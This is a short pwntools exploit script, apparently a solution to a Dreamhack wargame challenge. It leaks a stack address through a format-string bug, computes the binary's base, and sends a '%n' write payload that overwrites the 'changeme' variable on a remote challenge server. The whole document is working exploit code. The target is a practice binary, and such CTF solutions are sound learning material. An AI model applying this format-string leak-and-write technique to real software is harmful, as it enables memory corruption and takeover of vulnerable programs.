from pwn import *

context.arch = "amd64"
context.log_level = "debug"

p = remote("host3.dreamhack.games", 10163)
e = ELF("./fsb_overwrite")


p.sendline(b"%15$p")
addr = int(p.recvline()[:-1], 16)
base = addr - 0x1293
changeme = base + e.symbols["changeme"]

payload = b"%1337c%8$naaaaaa" + p64(changeme)
p.sendline(payload)

p.interactive()
